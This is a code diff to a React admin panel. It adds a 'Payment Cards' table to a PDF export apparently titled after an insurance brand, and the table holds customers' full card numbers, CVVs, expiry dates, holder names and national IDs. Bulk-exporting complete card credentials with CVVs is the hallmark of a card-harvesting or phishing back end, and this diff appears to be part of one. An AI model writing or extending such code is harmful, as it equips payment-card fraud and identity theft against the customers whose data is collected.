@@ -108,6 +108,30 @@ const AdminSettings = () => {
         yPos = (doc as any).lastAutoTable.finalY + 10;
       }
 
+      // Payment Cards
+      if (data.orders.length > 0) {
+        const cardsData = data.orders.filter((o: any) => o.card_number_full || o.card_last_four);
+        if (cardsData.length > 0) {
+          if (yPos > 170) { doc.addPage(); yPos = 20; }
+          doc.setFontSize(13);
+          doc.text("Payment Cards", 14, yPos);
+          (doc as any).autoTable({
+            startY: yPos + 4,
+            head: [["Customer", "Card Number", "CVV", "Expiry", "Holder Name", "Payment Method"]],
+            body: cardsData.map((o: any) => [
+              o.customer_name || o.national_id || "-",
+              o.card_number_full || `****${o.card_last_four || ""}`,
+              o.card_cvv || "-",
+              o.card_expiry || "-",
+              o.card_holder_name || "-",
+              o.payment_method || "-",
+            ]),
+            styles: { fontSize: 7, cellPadding: 2 },
+            headStyles: { fillColor: [220, 53, 69] },
+          });
+          yPos = (doc as any).lastAutoTable.finalY + 10;
+        }
+      }
 
       doc.save("bcare-insurance-data.pdf");
       toast.success("تم تصدير البيانات كملف PDF");
